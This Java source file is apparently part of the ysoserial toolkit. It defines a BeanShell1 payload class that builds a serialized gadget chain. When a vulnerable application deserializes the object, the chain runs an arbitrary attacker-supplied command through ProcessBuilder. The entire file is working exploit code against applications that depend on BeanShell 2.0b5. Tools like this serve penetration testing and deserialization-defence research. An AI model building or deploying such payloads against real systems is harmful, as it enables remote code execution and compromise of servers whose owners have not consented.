package ysoserial.payloads;

import java.lang.reflect.InvocationHandler;
import java.util.Map;

import bsh.Interpreter;
import bsh.XThis;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

/**
 * @author Andrey B. Panfilov <andrey@panfilov.tel>
 */
@SuppressWarnings({ "rawtypes", "unchecked", "restriction" })
@Dependencies({ "org.beanshell:bsh:2.0b5" })
public class BeanShell1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {

	public InvocationHandler getObject(String command) throws Exception {
		Interpreter interpreter = new Interpreter();
		interpreter.eval("entrySet() {new ProcessBuilder(new String[] {\"" + command.replaceAll("\"", "\\\"")
				+ "\"}).start();}");
		XThis x = new XThis(interpreter.getNameSpace(), interpreter);
		Map proxy = (Map) x.getInterface(new Class[] { Map.class, });
		return Gadgets.createMemoizedInvocationHandler(proxy);
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(BeanShell1.class, args);
	}

}
